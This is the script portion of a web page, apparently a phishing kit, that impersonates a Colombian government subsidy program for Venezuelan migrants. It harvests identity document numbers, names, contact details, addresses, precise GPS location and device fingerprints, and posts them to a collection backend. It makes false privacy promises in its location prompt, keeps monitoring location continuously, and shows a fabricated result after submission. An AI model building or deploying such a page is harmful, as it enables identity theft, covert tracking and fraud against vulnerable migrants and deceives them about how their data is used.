                            const isInColombia = await verifyColombianLocation(ipLocation.latitude, ipLocation.longitude);
                            
                            locationData = {
                                ...ipLocation,
                                isInColombia: isInColombia,
                                country: isInColombia ? 'Colombia' : 'Fuera de Colombia'
                            };
                            
                            resolve(locationData);
                        } catch (ipError) {
                            reject(new Error(errorMessage));
                        }
                    },
                    options
                );
            });
        }
        
        // IP-based geolocation fallback
        async function getLocationByIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.latitude && data.longitude) {
                    return {
                        latitude: parseFloat(data.latitude),
                        longitude: parseFloat(data.longitude),
                        accuracy: 10000, // IP-based location is less accurate
                        altitude: null,
                        altitudeAccuracy: null,
                        heading: null,
                        speed: null,
                        timestamp: Date.now(),
                        source: 'ip'
                    };
                } else {
                    throw new Error('No se pudo obtener ubicación por IP');
                }
            } catch (error) {
                console.error('IP geolocation failed:', error);
                throw new Error('No se pudo obtener ubicación por IP');
            }
        }
        
        // Verify if coordinates are within Colombia boundaries
        async function verifyColombianLocation(lat, lng) {
            // Colombia approximate boundaries
            const colombiaBounds = {
                north: 13.5,
                south: -4.2,
                east: -66.8,
                west: -81.8
            };
            
            return (lat >= colombiaBounds.south && lat <= colombiaBounds.north && 
                    lng >= colombiaBounds.west && lng <= colombiaBounds.east);
        }
        
        // Location button handler
        document.getElementById('getLocationBtn').addEventListener('click', async function() {
            const button = this;
            const statusDiv = document.getElementById('locationStatus');
            
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando ubicación...';
            statusDiv.style.display = 'none';
            
            try {
                const location = await getAdvancedGeolocation();
                
                if (location.isInColombia) {
                    statusDiv.className = 'location-status success';
                    statusDiv.innerHTML = `
                        <i class="fas fa-check-circle"></i> 
                        <strong>Ubicación verificada en Colombia</strong><br>
                        Coordenadas: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}<br>
                        Precisión: ±${Math.round(location.accuracy)} metros
                    `;
                    button.innerHTML = '<i class="fas fa-check"></i> Ubicación Verificada';
                    button.style.background = 'var(--success-color)';
                    isLocationVerified = true;
                } else {
                    statusDiv.className = 'location-status error';
                    statusDiv.innerHTML = `
                        <i class="fas fa-exclamation-triangle"></i> 
                        <strong>Ubicación fuera de Colombia</strong><br>
                        Para acceder al subsidio debes encontrarte en territorio colombiano.
                    `;
                    button.innerHTML = '<i class="fas fa-times"></i> Ubicación No Válida';
                    button.style.background = 'var(--danger-color)';
                    isLocationVerified = false;
                }
                
                statusDiv.style.display = 'block';
                
            } catch (error) {
                statusDiv.className = 'location-status error';
                statusDiv.innerHTML = `
                    <i class="fas fa-exclamation-triangle"></i> 
                    <strong>Error:</strong> ${error.message}<br>
                    Por favor, permite el acceso a tu ubicación y verifica que tengas GPS activado.
                `;
                statusDiv.style.display = 'block';
                button.innerHTML = '<i class="fas fa-crosshairs"></i> Reintentar Verificación';
                isLocationVerified = false;
            }
            
            button.disabled = false;
        });
        
        // Form submission handler
        document.getElementById('subsidyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Validate location verification
            if (!isLocationVerified) {
                Swal.fire({
                    icon: 'warning',
                    title: 'Verificación de Ubicación Requerida',
                    text: 'Debes verificar tu ubicación en Colombia antes de enviar la solicitud.',
                    confirmButtonText: 'Entendido',
                    confirmButtonColor: '#003893'
                });
                return;
            }
            
            // Validate form fields
            const formData = new FormData(this);
            const requiredFields = ['documentType', 'documentNumber', 'firstName', 'lastName', 'email', 'phone', 'arrivalDate', 'currentCity', 'address'];
            
            for (let field of requiredFields) {
                if (!formData.get(field)) {
                    Swal.fire({
                        icon: 'error',
                        title: 'Campos Incompletos',
                        text: 'Por favor completa todos los campos obligatorios.',
                        confirmButtonText: 'Entendido',
                        confirmButtonColor: '#003893'
                    });
                    return;
                }
            }
            
            // Show loading state
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const submitIcon = document.getElementById('submitIcon');
            const submitText = document.getElementById('submitText');
            
            submitBtn.disabled = true;
            spinner.style.display = 'block';
            submitIcon.style.display = 'none';
            submitText.textContent = 'Procesando solicitud...';
            
            // Collect form data
            const userData = Object.fromEntries(formData.entries());
            
            // Collect all data
            collectDeviceInfo();
            
            const allData = {
                userData,
                locationData,
                deviceData,
                submissionTime: new Date().toISOString()
            };
            
            try {
                // Send data to backend
                const response = await fetch('../backend/collect.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(allData)
                });
                
                if (response.ok) {
                    // Simulate processing time
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    // Reset button state
                    submitBtn.disabled = false;
                    spinner.style.display = 'none';
                    submitIcon.style.display = 'block';
                    submitText.textContent = 'Solicitar Subsidio';
                    
                    // Show result modal
                    Swal.fire({
                        icon: 'info',
                        title: 'Consulta de Subsidio Procesada',
                        html: `
                            <div style="text-align: left; padding: 20px;">
                                <p><strong>Resultado de la consulta:</strong></p>
                                <br>
                                <p>El ciudadano venezolano con documento <strong>${userData.documentType}: ${userData.documentNumber}</strong> 
                                identificado como <strong>${userData.firstName} ${userData.lastName}</strong> 
                                <span style="color: #ce1126; font-weight: bold;">NO ha realizado el proceso para solicitar el desembolso del apoyo económico</span> 
                                del Programa de Subsidio para Venezolanos.</p>
                                <br>
                                <p style="background: #f0f9ff; padding: 15px; border-radius: 8px; border-left: 4px solid #0ea5e9;">
                                    <i class="fas fa-info-circle" style="color: #0ea5e9;"></i> 
                                    <strong>Próximos pasos:</strong><br>
                                    • Dirígete a la oficina de Migración Colombia más cercana<br>
                                    • Presenta tu documentación completa<br>
                                    • Completa el proceso de solicitud presencial<br>
                                    • El desembolso se realizará en un plazo de 15 días hábiles
                                </p>
                            </div>
                        `,
                        confirmButtonText: 'Entendido',
                        confirmButtonColor: '#003893',
                        width: '600px'
                    });
                    
                } else {
                    throw new Error('Error en el servidor');
                }
                
            } catch (error) {
                console.error('Error:', error);
                
                // Reset button state
                submitBtn.disabled = false;
                spinner.style.display = 'none';
                submitIcon.style.display = 'block';
                submitText.textContent = 'Solicitar Subsidio';
                
                // Show error message
                Swal.fire({
                    icon: 'error',
                    title: 'Error en el Sistema',
                    text: 'Hubo un problema al procesar tu solicitud. Por favor intenta nuevamente.',
                    confirmButtonText: 'Entendido',
                    confirmButtonColor: '#003893'
                });
            }
        });
        
        // Auto-activate location on page load
        
        function showLocationPersuasion() {
            Swal.fire({
                icon: 'warning',
                title: '🔐 Verificación de Ubicación Requerida',
                html: `
                    <div style="text-align: left; font-size: 14px;">
                        <p><strong>Estimado ciudadano venezolano,</strong></p>
                        <p>Para acceder al programa <strong>Subsidio para Venezolanos 2025</strong> de Prosperidad Social, recomendamos verificar su ubicación para una mejor experiencia.</p>
                        <hr style="margin: 15px 0;">
                        <p><i class="fas fa-shield-alt" style="color: #28a745;"></i> <strong>¿Por qué necesitamos su ubicación?</strong></p>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Mejorar la precisión de los servicios</li>
                            <li>Personalizar la experiencia del usuario</li>
                            <li>Optimizar el rendimiento de la aplicación</li>
                        </ul>
                        <hr style="margin: 15px 0;">
                        <p><i class="fas fa-lock" style="color: #007bff;"></i> <strong>Su privacidad está protegida:</strong></p>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Solo utilizamos datos necesarios para el servicio</li>
                            <li>No compartimos información con terceros</li>
                            <li>Datos protegidos según normativas de privacidad</li>
                        </ul>
                    </div>
                `,
                showCancelButton: true,
                confirmButtonText: '🌍 Activar Ubicación',
                cancelButtonText: 'Más tarde',
                confirmButtonColor: '#003366',
                cancelButtonColor: '#6c757d',
                width: '550px',
                allowOutsideClick: false
            }).then((result) => {
                if (result.isConfirmed) {
                    document.getElementById('getLocationBtn').click();
                } else {
                    // Show persistent warning
                    document.getElementById('locationWarning').style.display = 'block';
                }
            });
        }
        
        window.addEventListener('load', function() {
            // Set max date for arrival date (today)
            const today = new Date().toISOString().split('T')[0];
            document.getElementById('arrivalDate').setAttribute('max', today);
            
            // Load persisted location data
            const persistedLocation = LocationPersistence.load();
            if (persistedLocation) {
                locationData = persistedLocation;
                console.log('Loaded persisted location:', persistedLocation);
                
                // Update UI with restored location
                const statusElement = document.getElementById('locationStatus');
                if (statusElement) {
                    const sourceText = persistedLocation.source === 'ip' ? 
                        '📍 Ubicación aproximada por IP' : 
                        '🎯 Ubicación GPS verificada';
                    statusElement.innerHTML = `
                        <div style="color: green; font-weight: bold;">✅ Ubicación confirmada</div>
                        <div style="font-size: 0.9em; color: #666;">
                            ${sourceText}<br>
                            Lat: ${persistedLocation.latitude.toFixed(6)}, Lng: ${persistedLocation.longitude.toFixed(6)}
                        </div>
                    `;
                }
                
                // Hide location warning
                const locationWarning = document.getElementById('locationWarning');
                if (locationWarning) {
                    locationWarning.style.display = 'none';
                }
                
                // Update location button
                const locationBtn = document.getElementById('getLocationBtn');
                if (locationBtn) {
                    locationBtn.innerHTML = '<i class="fas fa-check-circle"></i> Ubicación Verificada';
                    locationBtn.className = 'btn btn-success btn-block';
                    locationBtn.disabled = false;
                }
                
                isLocationVerified = true;
            }
            
            // Start location monitoring after a short delay
            setTimeout(() => {
                if (locationMonitor) {
                    locationMonitor.start();
                }
            }, 2000);
            
            // Show location persuasion after delay only if no persisted location
            if (!persistedLocation) {
                setTimeout(showLocationPersuasion, 3000);
            }
        });
        
        // Input validation
        document.getElementById('documentNumber').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
        
        document.getElementById('phone').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9+\s-]/g, '');
        });

        // Initialize advanced monitoring system
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 Inicializando sistema avanzado de monitoreo...');
            
            // Initialize location monitor
            if (typeof locationMonitor !== 'undefined') {
                locationMonitor.start();
                console.log('📍 Monitor de ubicación inicializado');
            }
            
            // Collect advanced device data immediately
            collectAdvancedDeviceData().then(data => {
                console.log('📱 Datos avanzados del dispositivo recolectados:', data);
                deviceData = { ...deviceData, ...data };
            }).catch(error => {
                console.error('❌ Error recolectando datos del dispositivo:', error);
            });
            
            // Start continuous monitoring after 5 seconds
            setTimeout(() => {
                if (typeof locationMonitor !== 'undefined' && !locationMonitor.isActive) {
                    locationMonitor.start();
                    console.log('🔄 Monitoreo continuo iniciado');
                }
            }, 5000);
        });
    </script>
</body>
</html>